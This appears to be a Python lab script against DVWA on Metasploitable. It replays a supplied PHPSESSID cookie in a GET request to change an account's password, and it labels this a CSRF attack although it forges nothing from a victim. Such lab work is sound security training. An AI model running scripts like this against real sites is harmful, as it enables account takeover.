import requests

#start a session
session = requests.Session()

#take user input
target_url = input("Enter the target URL for the CSRF attack (e.g., http://<Metasploitable_IP>/dvwa/vulnerabilities/csrf/): ")
password_current = input("Enter current password: ")
new_pass = input("Enter the new password: ")
confirmed_pass = input("Confirm the new password: ")

#get PHPSESSID from the user
#this is usually found in your browser's cookie storage after you log in
php_session_id = input("Enter your PHPSESSID: ")

#session cookies
cookies = {
    "PHPSESSID": php_session_id, 
    "security": "high" 
}

#payload for GET request
params = {
    "password_current" : password_current,
    "password_new": new_pass,
    "password_conf": confirmed_pass,
    "Change": "Change"
}

#send GET request
response = session.get(target_url, cookies=cookies, params=params)

#check if the password change was successful
if "<pre> Password Changed </pre>" in response.text:
    print("Password successfully changed!")
else:
    print("Password change failed. Check your session or payload.")
